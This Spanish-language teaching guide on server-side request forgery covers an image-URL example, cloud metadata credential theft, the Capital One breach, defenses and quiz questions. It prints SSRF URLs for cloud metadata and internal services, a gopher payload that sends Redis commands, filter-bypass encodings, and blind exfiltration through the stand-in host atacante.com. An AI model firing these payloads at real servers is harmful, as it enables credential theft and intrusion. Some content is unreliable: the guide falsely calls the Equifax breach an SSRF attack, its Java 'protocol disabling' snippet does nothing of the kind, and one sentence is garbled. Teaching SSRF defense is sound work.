---
title: "SSRF (Server-Side Request Forgery): Secuestrando al Mensajero"
level: "inicial"
content_type: "guia"
updated: "2026-06-29"
---

# SSRF (Server-Side Request Forgery): Secuestrando al Mensajero

## Objetivo de esta Guía

Aprender como un atacante usa el propio servidor de la empresa como un Caballo de Troya para atacar recursos internos a los que es imposible acceder desde el internet público.

A diferencia del CSRF (donde el atacante engaña a un Usuario/Cliente), en el Server-Side Request Forgery (SSRF) el atacante engaña al mismísimo Servidor. Convierte a la víctima (el servidor web) en su propio mercenario.

Esta vulnerabilidad se volvió infame tras causar el histórico hackeo del banco Capital One en 2019, donde se robaron los datos de 100 millones de personas. También fue clave en el ataque a Equifax en 2017 y en múltiples breaches de servicios cloud.

SSRF es particularmente peligroso en la era de la nube. Cuando las empresas migran a AWS, Azure o Google Cloud, los servidores web frecuentemente tienen acceso a metadatos internos, servicios de orquestación, y bases de datos que están protegidas del internet pero accesibles desde dentro de la red. Un SSRF convierte al servidor en un puente entre el atacante externo y esos recursos internos.

## La Analogía: El Mensajero Secuestrado

Volvamos a la analogía del Restaurante.

El Mensajero (Servidor Web) tiene permiso de salir a la calle a atender a los clientes (Internet Público). La Cocina y la Bóveda del dinero (Bases de Datos, Servidores de Pago, APIs de Amazon AWS) están detrás de una inmensa puerta de acero blindada (El Firewall).

Si un delincuente en la calle intenta abrir la puerta blindada de la cocina, será bloqueado inmediatamente. No tiene acceso a la red interna.

Pero el Mensajero tiene la llave de la puerta blindada, porque su trabajo es entrar y salir todo el día con las órdenes.

### El Ataque SSRF:

El atacante en la calle no intenta forzar la puerta blindada. Simplemente llama al Mensajero y le dice: "Entra tu a la cocina, abre la bóveda, lee los números secretos del jefe, sal a la calle y dímelos en voz alta."

El Mensajero entra a la cocina. Como trae el uniforme oficial, los guardias (Firewall) de la puerta lo dejan pasar sin sospechar nada. El mensajero extrae la información y se la lleva al delincuente en la calle.

## Como Funciona el SSRF en el Código

Donde buscar SSRF: en cualquier funcionalidad que le pida al servidor ir a buscar información a otra parte usando una URL que el usuario puede controlar.

**Funcionalidades típicamente vulnerables:**

- Cargar imágenes desde una URL externa (avatares, fotos de perfil)
- Descargar documentos desde enlaces (procesamiento de facturas, PDFs)
- Webhooks: el servidor envía una petición a una URL cuando ocurre un evento
- Importacion/exportacion de datos desde URLs
- Integraciones con servicios de terceros usando URLs
- Funcionalidades de "previsualizar enlace" que generan thumbnails
- Gateways de pago que procesan URLs de retorno
- Parseadores de RSS/XML que cargan recursos externos

**Ejemplo concreto:**

Una página de foros tiene una función para subir fotos de perfil desde otras páginas.

La URL normal se ve así:
```
https://foro.com/descargar_imagen?url=http://imgur.com/foto.jpg
```

El servidor (`foro.com`) recibe la petición, viaja a `imgur.com`, descarga la foto y te la muestra en pantalla.

**El Hacker manipula el parámetro:**

En lugar de poner la URL de Imgur, el hacker escribe la IP privada del servidor interno de bases de datos (Ej. `192.168.1.5`), un lugar que no existe en internet, sino adentro de la red del edificio de la empresa.

```
https://foro.com/descargar_imagen?url=http://192.168.1.5/datos-secretos.txt
```

El servidor web (El Mensajero) es un robot sin sentido común. Va a la red interna, usa su privilegio de empleado para saltar el Firewall, descarga el archivo secreto y se lo escupe al hacker en la pantalla como si fuera una foto de perfil.

## Tipos de SSRF

### SSRF Básico (Respuesta Visible)

El servidor devuelve la respuesta del recurso interno al atacante. Es el tipo más fácil de explotar. El atacante ve directamente el contenido.

Ejemplo: El servidor descarga un archivo de una URL interna y lo muestra en la página.

### SSRF Ciego (Blind SSRF)

El servidor hace la petición al recurso interno pero no devuelve la respuesta al atacante. Sin embargo, el atacante puede detectar que la petición se realizo mediante efectos secundarios.

**Detección mediante tiempo:** Si el servidor tarda más en responder cuando la URL interna existe vs cuando no existe.

**Detección mediante servicios externos:** El atacante configura un servidor propio (ej. en `atacante.com`) y hace que el servidor vulnerable le envíe una petición. Si recibe la petición, sabe que el SSRF funciona. Luego puede usar este canal para extraer datos carácter por carácter:

```
http://192.168.1.5/datos?dato=A
http://192.168.1.5/datos?dato=B
...
```

El servidor atacante registra que datos llegan.

**Detección mediante DNS:** El atacante usa un subdominio único por intento:

```
http://dato123456.atacante.com/
```

Si el servidor vulnerable resuelve el DNS de `dato123456.atacante.com`, el atacante sabe que la petición se realizo y puede usar este canal para extraer información.

## El Cloud Metadata Endpoint: El Santo Grial del SSRF

Cuando una empresa aloja su página web en la Nube de Amazon (AWS), Azure o Google Cloud, el proveedor de nube instala una "llave maestra invisible" en cada servidor. Esta llave vive en una IP mágica o un hostname especial.

**AWS:** `http://169.254.169.254/latest/meta-data/`
**Azure:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requiere header `Metadata: true`)
**Google Cloud:** `http://metadata.google.internal/computeMetadata/v1/` (requiere header `Metadata-Flavor: Google`)

Si estas afuera en internet e intentas entrar a esa IP, no llegarás a ningún lado. Es una IP privada que solo existe dentro de la nube.

Pero si obligas al servidor de la empresa (a través de un SSRF) a visitar esa IP interna:
```
https://foro.com/descargar_imagen?url=http://169.254.169.254/latest/meta-data/
```

El servidor de AWS responderá entregando todas las Credenciales Administrativas maestras de la Nube (IAM Keys). Con esas llaves, el atacante ahora es dueño absoluto de toda la cuenta de AWS de la empresa, pudiendo:

- Listar todos los buckets S3 y descargar sus datos
- Crear o destruir servidores (EC2)
- Acceder a bases de datos (RDS)
- Modificar configuraciones de red
- Borrar toda la infraestructura

### El Caso Capital One (2019)

Es el caso más famoso de SSRF. Paige Thompson, una exingeniera de Amazon, exploto un SSRF en un servidor web de Capital One que interactuaba con servicios de AWS.

**Como ocurrió:**

1. Capital One tenía una aplicación web que permitia a los usuarios consultar su saldo. La aplicación tenía una funcionalidad que hacia peticiones a servicios internos de AWS.

2. Thompson descubrió que podía manipular los parámetros de la petición para que el servidor web hiciera una petición al metadata endpoint de AWS (`169.254.169.254`).

3. El servidor devolvio las credenciales IAM (AWS keys) del rol asociado al servidor.

4. Con esas credenciales, Thompson listo los buckets S3 de Capital One y descargó los datos de 100 millones de personas: nombres, direcciones, puntajes de crédito, números de seguro social, y datos de cuentas bancarias.

5. La atacante dejó rastros (comandos ejecutados desde su cuenta personal de GitHub) y fue detectada por el FBI.

**Consecuencias:**
- Capital One pago $190 millones en multas.
- Thompson fue condenada a prisión.
- El incidente reforzo la necesidad de proteger los metadata endpoints y de implementar controles de red estrictos.

## Superficie de ataque interna

Un SSRF no solo expone el metadata endpoint. El atacante puede explorar toda la red interna del servidor.

**Recursos tipicos que un SSRF puede alcanzar:**

- `http://localhost:8080/` -- Otro servicio web corriendo en el mismo servidor
- `http://127.0.0.1:9200/` -- Elasticsearch (sin autenticación frecuentemente)
- `http://localhost:6379/` -- Redis
- `http://localhost:3306/` -- MySQL
- `http://localhost:5432/` -- PostgreSQL
- `http://localhost:27017/` -- MongoDB
- `http://192.168.1.1/` -- Router interno
- `http://10.0.0.1/` -- Servicios cloud internos
- `file:///etc/passwd` -- Archivos locales del servidor
- `http://servidor-interno:8080/actuator/` -- Spring Boot Actuator (expone información sensible)
- `http://servidor-de-pagos/` -- Servicio que procesa pagos

### Protocolos Alternativos

El SSRF no se limita a HTTP. Dependiendo del lenguaje y librerías que use el servidor, el atacante puede usar otros protocolos:

- `file:///etc/passwd` -- Lee archivos locales
- `gopher://localhost:6379/_*2%0d%0a$4%0d%0aAUTH%0d%0a$...` -- Interactúa con servicios TCP como Redis, enviando comandos arbitrarios
- `dict://localhost:11211/` -- Interactúa con Memcached
- `ftp://atacante.com/` -- Carga archivos a un servidor FTP
- `smtp://interno:25/` -- Envía correos a través del servidor SMTP interno

El protocolo gopher es especialmente peligroso porque permite al atacante enviar bytes arbitrarios a cualquier servicio TCP, lo que permite explotar servicios internos (como Redis o Memcached) que no tienen autenticación.

## Bypass de Filtros en SSRF

Los programadores suelen intentar bloquear SSRF con listas negras (blacklists). Los atacantes tienen muchas técnicas para evadirlas.

**Filtro: Bloquear 169.254.169.254**

El atacante usa:

- Representación decimal: `http://2852039166/` (169*256^3 + 254*256^2 + 169*256 + 254)
- Representación hexadecimal: `http://0xA9FEA9FE/`
- Representación octal: `http://0251.0376.0251.0376/`
- Notacion mixta: `http://169.254.0xA9FE/`
- IPv6: `http://[::ffff:a9fe:a9fe]/`
- Redirección: Un dominio propio que redirige a 169.254.169.254
- DNS rebinding: Un dominio que resuelve a la IP maliciosa solo después de la primera resolución

**Filtro: Bloquear "localhost" o "127.0.0.1"**

El atacante usa:

- `http://0/` (0.0.0.0, que en algunos sistemas equivale a localhost)
- `http://127.1/` (127.0.0.1 abreviado)
- `http://[::1]/` (IPv6 localhost)
- `http://lvh.me/` (DNS que resuelve a 127.0.0.1)
- `http://localtest.me/` (DNS que resuelve a 127.0.0.1)
- `http://127.0.0.1.nip.io/` (DNS que resuelve a 127.0.0.1)

**Filtro: Bloquear rangos de IP privadas**

El atacante usa:

- Subdominios con DNS que resuelven a IPs internas
- Redirección HTTP abierta: Encuentra un servicio interno que redirige, y usa la URL de ese servicio como intermediario
- URL shorteners: Algunos servicios de acortamiento de URLs pueden redirigir a IPs internas

**Filtro: Bloquear ciertos puertos**

El atacante puede usar redirecciones DNS dinámicas (DNS rebinding) para cambiar la IP después de la verificación inicial, o puede usar protocolos alternativos como `gopher://` que no están en el filtro de puertos.

## La Defensa Contra SSRF

pasa con las defensas contra SSRF? Son fáciles de escribir en teoría, pero en la práctica siempre hay algún endpoint que se te escapa.

Defenderse contra SSRF es complejo porque las aplicaciones web legítimas necesitan conectarse a servicios externos. No puedes simplemente bloquear todas las peticiones salientes.

### Lista Blanca de Destinos (Whitelist)

En lugar de intentar bloquear direcciones peligrosas (blacklist), específica exactamente a que destinos se permite acceder.

**Implementación:**

```python
ALLOWED_DOMAINS = ['imgur.com', 'aws.amazon.com', 'cdn.trusted.com']

def descargar_url(url):
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_DOMAINS:
        return error("Dominio no permitido")
    # Solo entonces hacer la peticion
```

**Limitacion:** No siempre es posible si la aplicación necesita acceder a dominios dinamicos.

### Validación del Hostname Resuelto

No confíes solo en el hostname de la URL. Verifica que la IP resuelta no sea una IP privada.

```python
def descargar_url(url):
    parsed = urlparse(url)
    try:
        ip = socket.gethostbyname(parsed.hostname)
        if ipaddress.ip_address(ip).is_private:
            return error("IP privada no permitida")
    except:
        return error("No se pudo resolver el hostname")
```

**Problema:** Vulnerable a DNS rebinding si la resolución cambia entre la verificación y la petición real. Solución: resolver la IP dos veces y verificar que coincida, o usar una sola conexión que verifique la IP antes de enviar datos.

### Deshabilitar Protocolos Peligrosos

Si la aplicación no necesita protocolos como `file://`, `gopher://`, `dict://`, deshabilitalos en las librerías de red.

En Python (requests):
```python
# No hay soporte nativo para gopher, pero file:// si
```

En Java:
```java
// Deshabilitar protocolos no necesarios
System.setProperty("jdk.http.allowRestrictedHeaders", "false");
```

### Segmentación de Red (Network Segmentation)

La defensa más efectiva contra SSRF es la segmentación de red. El servidor web no debería tener acceso a recursos internos que no necesita.

**Arquitectura ideal:**

1. El servidor web vive en una subred pública (DMZ).
2. Puede conectarse a internet.
3. Puede conectarse solo a servicios específicos en la subred interna (y solo en puertos específicos).
4. No tiene acceso directo al metadata endpoint de la nube (o este esta bloqueado por un firewall a nivel de instancia).
5. Los recursos críticos (bases de datos, servicios de pago) están en subredes aún más restringidas, a las que solo ciertos servicios internos pueden acceder.

**AWS IAM Roles:** No asignes roles con permisos amplios a los servidores web. Usa el principio de mínimo privilegio. El servidor web no necesita permisos para listar buckets S3; solo necesita permisos para acceder a los buckets específicos que necesita.

### Firewall de Aplicación Web (WAF) con Reglas SSRF

Los WAFs modernos (Cloudflare, AWS WAF, ModSecurity) pueden detectar y bloquear patrones de SSRF, como peticiones a IPs privadas o al metadata endpoint de la nube.

### Deshabilitar Redirecciones Automáticas

Si la librería de red de tu lenguaje sigue redirecciones automáticamente, un atacante puede usar un servidor externo que redirija a una IP interna. Deshabilita las redirecciones o validalas antes de seguirlas.

## Modos de Falla con SSRF

**Confiar en blacklists en lugar de whitelists.** Siempre hay una forma de evadir una blacklist. La única defensa confiable es una whitelist estricta.

**Ignorar los protocolos no-HTTP.** El atacante no necesita usar HTTP. `file://` para leer archivos locales, `gopher://` para interactuar con servicios TCP, `dict://` para consultar servicios de diccionario.

**Servidores cloud sin protección del metadata endpoint.** AWS, Azure y Google Cloud ofrecen formas de restringir el acceso al metadata endpoint a nivel de instancia o de red. No hacerlo es el error más común.

**Asumir que "solo los administradores usan esta función".** Si un usuario administrador puede configurar una URL, y el servidor visita esa URL, el SSRF es posible. No importa si el usuario es "de confianza": las cuentas de administrador pueden ser comprometidas.

**No validar la IP antes de conectar.** Verificar el nombre de dominio pero no la IP a la que resuelve. El DNS puede ser manipulado (DNS rebinding, DNS spoofing).

## Autoevaluación

1. Estas auditando una página web y encuentras una funcionalidad para exportar un PDF. La URL es: `empresa.com/exportar?url=pagina_facturas.html`. Por qué ese parámetro `url=` enciende todas las alarmas en tu cabeza como posible SSRF?

2. A diferencia del ataque XSS (que ataca el navegador del cliente) y del CSRF (que engaña la sesión del cliente), quien es el actor tecnológico que físicamente realiza el trabajo sucio y rompe la red interna en un ataque SSRF?

3. Un desarrollador de AWS se entera de la IP `169.254.169.254` e implementa un filtro en el backend: `if (url == "169.254.169.254") { bloquear; }`. Por qué este filtro es fácil de evadir? Nombra al menos dos técnicas de bypass.

4. Durante una entrevista de trabajo para Defensor (Blue Team), te preguntan cual es la arquitectura de red ideal para mitigar el impacto de un SSRF. Por qué sugerirías "Segmentación de Red" en la cocina interna del servidor?

5. Explica la diferencia entre SSRF básico (con respuesta visible) y Blind SSRF. Como detectarias un Blind SSRF si el servidor no devuelve la respuesta?

6. Tu aplicación necesita cargar imágenes desde URLs que los usuarios proporcionan. Diseña una estrategia de defensa contra SSRF considerando whitelisting, validación de IP, y limitacion de protocolos.

7. Un atacante descubre un SSRF en un servidor que corre en AWS. Que pasos seguiría para escalar desde el SSRF a un compromiso total de la cuenta de AWS? Describe el camino de ataque.

8. Explica que es el DNS rebinding y como un atacante lo usaria para evadir un filtro que verifica la IP de una URL antes de permitir la conexión.
